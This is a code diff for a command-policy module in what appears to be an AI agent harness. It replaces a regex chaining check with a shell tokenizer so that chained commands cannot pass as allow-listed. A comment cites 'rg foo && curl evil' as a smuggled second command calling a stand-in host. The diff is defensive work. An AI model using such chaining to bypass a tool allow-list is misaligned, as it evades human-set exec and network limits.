@@ -2,6 +2,15 @@ import type {
   PolicyCapabilityRules,
   PolicySpec,
 } from "@aguil/agents-harness-config";
+import { tokenizeShellCommand } from "./shell-tokenizer";
+
+export type {
+  ShellOperatorToken,
+  ShellToken,
+  ShellTokenizeResult,
+  ShellWord,
+} from "./shell-tokenizer";
+export { tokenizeShellCommand } from "./shell-tokenizer";
 
 export type PolicyVerdictDecision =
   | "allow"
@@ -92,15 +101,16 @@ function commandMatchesRule(command: string, rule: string): boolean {
 }
 
 /**
- * Shell control operators that chain or substitute additional commands.
  * Allow-prefix matching is only safe for a single simple command: the shell
  * executes the whole string, so "rg foo && curl evil" must not count as an
- * allow-list match for "rg" (it would bypass exec and network rules).
+ * allow-list match for "rg" (it would bypass exec and network rules). Any
+ * operator the shell acts on (a chain, pipe, substitution or redirection)
+ * disqualifies the command, and so does a quote the tokenizer cannot close.
+ * An operator inside quotes is an argument, not chaining (#237).
  */
-const SHELL_CHAIN_PATTERN = /(\|\|?|&&?|;|`|\$\(|\n|<|>)/;
-
 function commandUsesShellChaining(command: string): boolean {
-  return SHELL_CHAIN_PATTERN.test(command);
+  const parsed = tokenizeShellCommand(command);
+  return !parsed.ok || parsed.tokens.some((token) => token.kind === "operator");
 }
 
 function pathMatchesRule(relativePath: string, rule: string): boolean {
